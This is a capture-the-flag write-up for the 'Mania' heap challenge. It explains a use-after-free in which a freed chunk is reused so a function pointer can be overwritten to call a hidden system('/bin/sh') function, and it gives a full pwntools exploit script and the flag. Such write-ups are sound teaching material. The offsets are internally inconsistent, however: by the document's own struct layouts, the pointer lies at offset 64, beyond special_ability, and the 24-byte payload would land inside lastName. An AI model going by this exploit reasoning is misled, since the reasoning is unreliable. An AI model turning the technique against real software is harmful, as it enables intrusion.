# boroCTF 2026 - Mania (Pwn)

## Challenge Information

**Category:** Pwn
**Difficulty:** Easy
**Points:** 200

### Description

> Poor Joe has been doing binary exploitation challenges for too long and has gone mad. Can you help him re-adapt to society and have a real conversation?

## Initial Analysis

Running the binary presents a simple menu:

```text
[1] - Imagine friend
[2] - Forget friend
[3] - Meet person
[4] - Ghost person
[5] - Interact
```

The challenge revolves around two heap-allocated structures:

```c
typedef struct {
    char firstName[32];
    char lastName[32];
    void (*conversate)();
} realPerson;

typedef struct {
    char title[32];
    char special_ability[32];
    int rating;
} imaginaryFriend;
```

The interesting observation is that both structures occupy the same heap chunk size:

```text
32 + 32 + 8 = 72 bytes   (realPerson)
32 + 32 + 4 (+ padding) ≈ 72 bytes   (imaginaryFriend)
```

This means that after freeing a `realPerson`, a newly allocated `imaginaryFriend` will likely reuse the exact same heap chunk.

---

## Vulnerability

When a real person is removed:

```c
void ghostPerson() {
    if (RF == NULL) {
        puts("You don't have any friends to ghost.");
        return;
    }

    free(RF);
}
```

The pointer is freed but never set to `NULL`.

This creates a classic **Use-After-Free (UAF)** vulnerability.

Later, an imaginary friend can be allocated into the same heap chunk:

```c
imaginaryFriend *friend = malloc(sizeof(imaginaryFriend));
```

Since both allocations have identical sizes, the freed chunk is reused.

The `special_ability` field overlaps the location where the function pointer originally existed:

```text
realPerson
+-------------------+
| firstName[32]     |
+-------------------+
| lastName[32]      |
+-------------------+
| conversate ptr    |
+-------------------+

imaginaryFriend
+-------------------+
| title[32]         |
+-------------------+
| special_ability   |
+-------------------+
| rating            |
+-------------------+
```

Heap layout after reuse:

```text
title            -> firstName
special_ability  -> lastName + conversate pointer
```

Therefore, writing into `special_ability` allows us to overwrite:

```c
RF->conversate
```

---

## Finding the Target Function

The binary contains a hidden function:

```c
void idealConversation() {
    puts("Wow! You made a real connection!");
    system("/bin/sh");
}
```

Using Ghidra or objdump:

```bash
objdump -d mania | grep idealConversation
```

We obtain:

```text
idealConversation = 0x401731
```

---

## Exploitation

The vulnerable input:

```c
fgets(friend->special_ability, 32, stdin);
```

allows 31 controllable bytes.

The function pointer sits 24 bytes into the overlapping region.

Payload:

```python
b"A"*24 + b"\x31\x17\x40"
```

Because the binary is non-PIE, only the lower bytes of the address need to be overwritten. The null terminator supplied by `fgets()` completes the remaining bytes.

### Exploit Steps

1. Create a real person.
2. Free the real person.
3. Create an imaginary friend.
4. Overwrite the dangling function pointer with `idealConversation`.
5. Trigger interaction.

---

## Exploit Script

```python
from pwn import *

p = remote("0agn86asl3d2.boroctf.com", 44996)

p.sendlineafter(b"> ", b"3")
p.sendlineafter(b"firstName: ", b"A")
p.sendlineafter(b"lastName: ", b"B")

p.sendlineafter(b"> ", b"4")

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"title: ", b"AAAA")

payload = b"A"*24 + b"\x31\x17\x40"
p.sendlineafter(b"special ability: ", payload)

p.sendlineafter(b"rating: ", b"1")

p.sendlineafter(b"> ", b"5")

p.interactive()
```

---

## Result

```text
$ python solve.py

[+] Opening connection to 0agn86asl3d2.boroctf.com on port 44996
[*] Switching to interactive mode

Wow! You made a real connection!

$ cat flag*
boroCTF{hYp0M&nic_3xplO1taTio4}
```

## Flag

```text
boroCTF{hYp0M&nic_3xplO1taTio4}
```

## Takeaways

* Freeing memory without nullifying pointers can lead to Use-After-Free vulnerabilities.
* Heap chunks of identical sizes are commonly recycled by the allocator.
* Function pointers stored inside heap objects are attractive overwrite targets.
* Even a small partial overwrite can be enough when PIE is disabled.

